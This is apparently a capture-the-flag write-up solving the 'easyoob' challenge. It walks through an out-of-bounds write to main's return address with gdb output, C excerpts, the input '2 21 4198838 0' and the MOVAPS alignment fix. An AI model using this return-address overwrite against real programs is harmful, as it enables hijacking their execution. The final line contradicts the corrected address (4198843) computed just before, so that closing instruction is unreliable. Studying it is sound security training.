# 2. easyoob
> Author: Wong Chee Hong

easyoob requires attackers to exploit a buffer overflow vulnerability in the stack, which gives users control of certain information stored on the stack.

For each function call, a stack frame is created for that function that has been called. The first item pushed ontop of the stack during stack frame setup is the return address, which specifies which address the program execution should return to once the callee has returned. By overwriting this address with a different one, the callee will return to the incorrect address, which can allow attackers to manipulate the execution flow of the program.

In this case, the incorrect address we want to use is the address of the `ezflag()` function. In gdb, call `disassemble ezflag` to get the dump of this function:

```
gdb-peda$ disas ezflag
Dump of assembler code for function ezflag:
   0x00000000004011b6 <+0>:     endbr64
   0x00000000004011ba <+4>:     push   rbp
   0x00000000004011bb <+5>:     mov    rbp,rsp
   0x00000000004011be <+8>:     lea    rdi,[rip+0xe43]        # 0x402008
   0x00000000004011c5 <+15>:    call   0x401090 <system@plt>
   0x00000000004011ca <+20>:    nop
   0x00000000004011cb <+21>:    pop    rbp
   0x00000000004011cc <+22>:    ret
End of assembler dump.
```
Thus, we want to jump to this address: `0x00000000004011b6`, or anywhere before `0x00000000004011be` since we want to invoke the call instruction to print our flag.

For this challenge, we observe that a local buffer/array (`leaderboard[20]`) has been initialized in the main function:

```c
int main()
{
    entry leaderboard[20];

    setup_io();
    puts(BANNER);
    usage();

    command cmd;
    do {
        cmd = get_command();
        if (cmd.op == 1) handle_read(leaderboard, cmd);
        else if (cmd.op == 2) handle_write(leaderboard, cmd);
    } while (cmd.op != 3);

    puts("Thanks for using LeaderboardDB. Your changes are not saved.");

    return 0;
}
```

We also observe that the `handle_write` function accepts the base address of the array as its first argument, and allows writing to **any** index of the array. This means we can write to `leaderboard[21]` or `leaderboard[-1]`.

```c
void handle_write(entry* leaderboard, command cmd)
{
    leaderboard[cmd.pos].userid = cmd.userid;
    leaderboard[cmd.pos].score = cmd.score;
    printf("%d. [%d]  %d\n", cmd.pos, leaderboard[cmd.pos].userid, leaderboard[cmd.pos].score);
}
```

In C, arrays are contiguous sections of memory. So if we know the target address on the stack we want to overwrite, we can find its offset from the base address of the of the array, and calculate the index. 

If one is familiar enough with x86 stack frame setup, you would know that for a stack frame, 
1. the return address is pushed, followed by 
2. the frame pointer, followed by 
3. any local variables.

For the `main` function, the only local variable is `leaderboard[20]`, which occupies 160 bytes (each index is a struct of 2 integers, which takes up 8 bytes, hence 20 * 8 = 160). 

Factoring the frame pointer and return address on the stack (8 bytes each), we know that the return address is stored 176 bytes from the base address of `leaderboard`. For an additional 16 bytes, we need to out of bounds by 2 more indices, which is `leaderboard[21]`  (remember that `leaderboard[19]` is the 20-th item cuz 0-based indexing).

Thus, starting the program, we can send the following input:
```
2 21 4198838 0
```
where 4198838 is 0x00000000004011b6 in base 10.

This overwrites the 21st index to the address we want, and then we can send the next input 
```
3
``` 
in order for `main` to return itself to the address we just planted.

## [The MOVAPS problem](https://ropemporium.com/guide.html#:~:text=aren%27t%20immediately%20obvious.-,The%20MOVAPS%20issue,-If%20you%27re%20segfaulting)

If we debug this program with the above inputs in gdb, we can see that it indeed entered the `ezflag` function:

```
[-------------------------------------code-------------------------------------]
   0x4011ac <__do_global_dtors_aux+44>: nop    DWORD PTR [rax+0x0]
   0x4011b0 <frame_dummy>:      endbr64
   0x4011b4 <frame_dummy+4>:    jmp    0x401140 <register_tm_clones>
=> 0x4011b6 <ezflag>:   endbr64 
   0x4011ba <ezflag+4>: push   rbp
   0x4011bb <ezflag+5>: mov    rbp,rsp
   0x4011be <ezflag+8>: lea    rdi,[rip+0xe43]        # 0x402008
   0x4011c5 <ezflag+15>:        call   0x401090 <system@plt>
```
But it somehow still results in a `SEGFAULT` on some devices.

This is because on certain x86-64 bit architectures, certain versions of `GLIBC` depends on the `movaps` instruction to move data onto the stack. This `movaps` instruction requires the stack to be 16-byte alligned, otherwise it segfaults. In the `ezflag` function, it calls the `GLIBC` function `system()` which depends on the `movaps` instruction, and hence we need to ensure that the stack is 16-byte alligned when the program reaches the `call` instruction in assembly.

Stepping until the `call` instruction at `ezflag+15`, we see that the current stack address is now 
`0x7fffffffdf48`, which is not 16 byte alligned! A 16-byte alligned address means that the least significant digit must be `0`, such the address is in multiples of 16.

```
gdb-peda$ ni
[-------------------------------------code-------------------------------------]
   0x4011ba <ezflag+4>: push   rbp
   0x4011bb <ezflag+5>: mov    rbp,rsp
   0x4011be <ezflag+8>: lea    rdi,[rip+0xe43]        # 0x402008
=> 0x4011c5 <ezflag+15>:        call   0x401090 <system@plt>   //WE ARE HERE
   0x4011ca <ezflag+20>:        nop
   0x4011cb <ezflag+21>:        pop    rbp
   0x4011cc <ezflag+22>:        ret    
   0x4011cd <usage>:    endbr64
Guessed arguments:
arg[0]: 0x402008 ("cat ./ezflag.txt")
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf48 --> 0x0                        // OBSERVE THE ADDRESS HERE
0008| 0x7fffffffdf50 --> 0x100000060
0016| 0x7fffffffdf58 --> 0x7fffffffe038 --> 0x7fffffffe262 ("/mnt/c/Users/hazy/Desktop/greyctf/easyoob/easyoob")
0024| 0x7fffffffdf60 --> 0x1f7fb1618
0032| 0x7fffffffdf68 --> 0x401473 (<main>:      endbr64)
0040| 0x7fffffffdf70 --> 0x401530 (<__libc_csu_init>:   endbr64)
0048| 0x7fffffffdf78 --> 0x23e98ef42292644d
0056| 0x7fffffffdf80 --> 0x4010d0 (<_start>:    endbr64)
[------------------------------------------------------------------------------]
```

In fact, `0x7fffffffdf48` is a multiple of 8, and we are 8 bytes shy of being 16 bytes alligned. So we have to push 8 more bytes or remove 8 bytes from the stack. Observing the instructions **before** the `call` instruction, we see that `ezflag+4`'s instruction is `push rbp`, which pushes an 8 byte pointer onto the stack, causing our stack to be 8 bytes misalligned. 

So, instead of jumping to `ezflag+0`, we should return to `ezflag + 5`, to prevent `ezflag+4` from pushing 8 bytes onto the stack. Calculating the final address of our return target, it is `0x4011bb`, or `4198843` in decimal.

The final exploit should be to send `2 21 4198838 0`, followed by `3` to the challenge server.
